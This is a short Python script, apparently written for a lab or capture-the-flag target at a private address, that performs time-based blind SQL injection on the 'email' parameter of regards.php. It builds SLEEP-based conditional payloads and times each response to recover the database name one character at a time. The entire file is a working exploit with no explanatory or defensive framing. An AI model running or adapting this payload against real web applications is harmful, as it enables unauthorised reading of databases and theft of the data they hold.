import os
import requests
import time

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

# GET THE NAME OF THE DATABASE


for i in range(1, 8):
    for char in chars:
        target = "http://10.102.87.195/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
        target = target.replace("SLEEP(5)", "IF(LENGTH(DATABASE())='7', SLEEP(1), SLEEP(0.5))")
        target = target.replace("LENGTH(DATABASE())='7'","SUBSTRING(LOWER(DATABASE()),iPos,1)='char'")
        target = target.replace("iPos", str(i))
        target = target.replace("char", char)
        r = requests.get(target)
        print(r.elapsed.total_seconds(), target)

        taken = r.elapsed.total_seconds()
        if taken > 0.2:
            if taken > 1.0:
                print("{} = {}".format(i, char))
                break
        else:
            print("ERROR {} {}".format(i, char))

